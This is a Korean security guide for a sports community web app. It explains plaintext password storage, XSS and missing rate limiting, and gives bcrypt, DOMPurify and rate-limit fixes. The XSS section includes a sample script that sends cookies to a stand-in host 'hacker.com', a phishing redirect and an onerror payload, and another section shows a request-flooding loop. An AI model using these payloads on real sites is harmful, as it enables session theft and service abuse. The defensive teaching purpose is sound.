# 🔒 애슬리트 타임 보안 가이드

## 🚨 현재 보안 취약점 상세 설명

### 1. 🔓 비밀번호 평문 저장 문제

#### 왜 위험한가?
```javascript
// 현재 상황 - 데이터베이스에 이렇게 저장됨
{
  id: 1,
  title: "게시글",
  password: "mypassword123"  // 😱 누구나 읽을 수 있는 평문!
}
```

**실제 위험 시나리오:**
1. **데이터베이스 유출 시**: 해커가 DB에 접근하면 모든 비밀번호를 즉시 사용 가능
2. **내부자 위협**: DB 관리자나 개발자가 사용자 비밀번호를 볼 수 있음
3. **백업 파일 노출**: 백업 파일이 유출되면 과거 모든 비밀번호 노출
4. **법적 책임**: 개인정보보호법 위반으로 과징금 부과 가능

#### bcrypt 해싱 솔루션
```javascript
// 평문: "mypassword123"
// bcrypt 해시: "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGt8WJG/ttP4mhSL6i"
// 
// 특징:
// - 같은 비밀번호도 매번 다른 해시 생성 (salt 덕분)
// - 역변환 불가능 (단방향 암호화)
// - 검증은 가능하지만 원문 복구는 불가능
```

### 2. 💉 XSS (Cross-Site Scripting) 공격

#### 왜 위험한가?
사용자가 입력한 악성 스크립트가 다른 사용자 브라우저에서 실행됨

**실제 공격 예시:**
```javascript
// 해커가 게시글 제목에 이렇게 입력하면:
<script>
  // 1. 쿠키 훔치기
  fetch('https://hacker.com/steal?cookie=' + document.cookie);
  
  // 2. 사용자 대신 게시글 삭제
  fetch('/api/posts/1', { method: 'DELETE' });
  
  // 3. 피싱 사이트로 리다이렉트
  window.location = 'https://fake-athletetime.com';
</script>

// 또는 이미지 태그 악용:
<img src="x" onerror="alert('해킹당함!')">
```

**피해 사례:**
- 세션 하이재킹: 다른 사용자로 로그인
- 개인정보 탈취: 폼 데이터 가로채기
- 웹사이트 변조: 가짜 콘텐츠 표시

#### DOMPurify 솔루션
```javascript
// 사용자 입력
const userInput = '<script>alert("hack")</script><b>안녕</b>';

// DOMPurify 정제 후
const cleaned = DOMPurify.sanitize(userInput);
// 결과: '<b>안녕</b>'  (스크립트 제거됨!)
```

### 3. 🚦 Rate Limiting (무차별 공격 방지)

#### 왜 필요한가?
**공격 시나리오:**
```javascript
// 해커의 자동화 스크립트
for (let i = 0; i < 1000000; i++) {
  // 1초에 수천 개 게시글 작성
  fetch('/api/posts', {
    method: 'POST',
    body: JSON.stringify({ title: `스팸 ${i}` })
  });
}

// 또는 조회수 조작
for (let i = 0; i < 100000; i++) {
  fetch('/api/posts/1/views', { method: 'PUT' });
}
```

**피해:**
- 서버 다운 (DDoS)
- 데이터베이스 과부하
- 정상 사용자 접속 불가
- 클라우드 비용 폭증

#### Rate Limiting 솔루션
```javascript
// 제한 설정
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15분 동안
  max: 100,  // 최대 100개 요청만 허용
  message: '너무 많은 요청입니다'
});

// 결과: 101번째 요청부터 차단됨
```

## 📊 위험도 평가

| 취약점 | 현재 위험도 | 피해 규모 | 해결 난이도 | 우선순위 |
|--------|------------|-----------|-------------|----------|
| 비밀번호 평문 저장 | 🔴 매우 높음 | 전체 사용자 | 쉬움 | 1순위 |
| XSS 공격 | 🔴 높음 | 개별 사용자 | 보통 | 2순위 |
| Rate Limiting 없음 | 🟡 중간 | 서비스 전체 | 쉬움 | 3순위 |
| CSRF 토큰 없음 | 🟡 중간 | 개별 사용자 | 보통 | 4순위 |
| HTTPS 미적용 | 🟢 낮음 (Render/Netlify 자동) | - | - | - |

## 🛠️ 즉시 적용 가능한 해결책

### Step 1: 패키지 설치
```bash
npm install bcrypt isomorphic-dompurify express-rate-limit helmet
```

### Step 2: 서버 코드 수정 (server-postgres.js)

```javascript
// 1. 상단에 import 추가
const bcrypt = require('bcrypt');
const DOMPurify = require('isomorphic-dompurify');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

// 2. 보안 미들웨어 적용
app.use(helmet());  // 보안 헤더 자동 설정

// 3. Rate Limiting 적용
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use('/api/', limiter);

// 4. 게시글 작성 시 비밀번호 해싱
app.post('/api/posts', async (req, res) => {
  const { password, title, content, ...rest } = req.body;
  
  // 비밀번호 해싱
  const hashedPassword = await bcrypt.hash(password, 10);
  
  // XSS 방지
  const cleanTitle = DOMPurify.sanitize(title);
  const cleanContent = DOMPurify.sanitize(content);
  
  // DB 저장
  await pool.query(
    'INSERT INTO posts (...) VALUES (...)',
    [cleanTitle, cleanContent, hashedPassword, ...]
  );
});

// 5. 삭제 시 비밀번호 검증
app.delete('/api/posts/:id', async (req, res) => {
  const { password } = req.body;
  const { rows } = await pool.query(
    'SELECT password FROM posts WHERE id = $1',
    [req.params.id]
  );
  
  // bcrypt로 비교
  const isValid = await bcrypt.compare(password, rows[0].password);
  if (!isValid) {
    return res.status(403).json({ error: '비밀번호 불일치' });
  }
  
  // 삭제 진행
});
```

### Step 3: 클라이언트 코드 수정 (community.html)

```javascript
// XSS 방지 함수 강화
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
    '/': '&#x2F;'
  };
  return text.replace(/[&<>"'\/]/g, m => map[m]);
}

// 모든 사용자 입력에 적용
document.getElementById('postContent').innerHTML = escapeHtml(post.content);
```

## 📈 보안 강화 로드맵

### Phase 1 (즉시 - 1일)
- ✅ bcrypt 비밀번호 해싱
- ✅ 기본 Rate Limiting
- ✅ HTML 이스케이핑

### Phase 2 (1주일)
- DOMPurify 전체 적용
- CSRF 토큰 구현
- 세션 기반 인증

### Phase 3 (1개월)
- 2FA (2단계 인증)
- 보안 로그 시스템
- 침입 탐지 시스템

## 🎯 예상 효과

### Before (현재)
- 해킹 위험: 90%
- 데이터 유출 시 피해: 치명적
- 법적 리스크: 높음

### After (보안 적용 후)
- 해킹 위험: 10% 이하
- 데이터 유출 시 피해: 최소화 (해시로 보호)
- 법적 리스크: 낮음 (규정 준수)

## 💡 추가 권장사항

1. **정기 보안 점검**
   - 월 1회 취약점 스캔
   - 분기별 모의 해킹

2. **보안 교육**
   - 개발자 보안 코딩 교육
   - 사용자 보안 인식 제고

3. **모니터링**
   - 실시간 공격 탐지
   - 이상 행동 알림

## 📞 도움이 필요하신가요?

보안 구현에 어려움이 있다면:
1. 구체적인 코드 작성 도와드립니다
2. 단계별 구현 가이드 제공
3. 테스트 시나리오 작성

**Remember: 보안은 선택이 아닌 필수입니다! 🛡️**